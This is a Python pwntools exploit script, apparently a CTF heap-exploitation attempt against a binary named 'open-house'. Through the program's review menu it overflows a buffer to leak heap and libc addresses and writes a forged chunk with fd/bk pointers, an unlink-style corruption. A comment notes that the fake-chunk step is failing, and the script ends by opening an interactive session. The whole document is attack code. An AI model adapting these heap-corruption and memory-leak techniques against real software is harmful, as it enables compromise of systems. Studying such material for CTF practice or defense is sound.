from pwn import *
context.binary = binary = "./open-house"

def create(review):
	io.sendlineafter(b">", b"c")
	io.sendlineafter(b"review", review)

def view():
	io.sendlineafter(b">", b"v")

def modify(index, review):
	io.sendlineafter(b">", b"m")
	io.sendlineafter(b"replace", str(index).encode())
	io.sendlineafter(b"with", review)

def delete(index):
	io.sendlineafter(b">", b"d")
	io.sendlineafter(b"delete", str(index).encode())

io = process(binary)
libc = io.elf.libc
if args.GDB:
	gdbscript="""
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

create(b"123")
create(b"456")
modify(12, b"A"*516)
delete(11)
view()

io.recvuntil(b'**** - AAAA')
io.recv(512)
heap = unpack(io.recv(4), 'all')
log.info(f"got heap leak: {hex(heap)}")
modify(11, b"A"*512 + p32(heap-0x100) + p32(heap) + p32(0) + p32(0x501))

# creating our fake chunk, failing here
payload = p32(0)			# prev_size
payload += p32(0x311)	# size(size>1024 to get a large bin)
payload += p32(heap - 0x100 - 0x18)	# fd
payload += p32(heap - 0x100 - 0x10)	# bk
# payload += p32(0x500)
# payload += p32(0x500)
payload = payload.rjust(280, b"\0")
modify(9, payload)

for i in range(9):
	delete(1)

for i in range(9):
	create(b"1")

view()
for _ in range(19):
	io.recvline()
io.recv(2)
lib = unpack(io.recv(4), "all")
log.info(f"got libc leak: {hex(lib)}")
libc.address = lib - 0x22aa38
log.info(f"got libc base: {hex(libc.address)}")
io.recvline()

for i in range(3):
	delete(1)

io.interactive()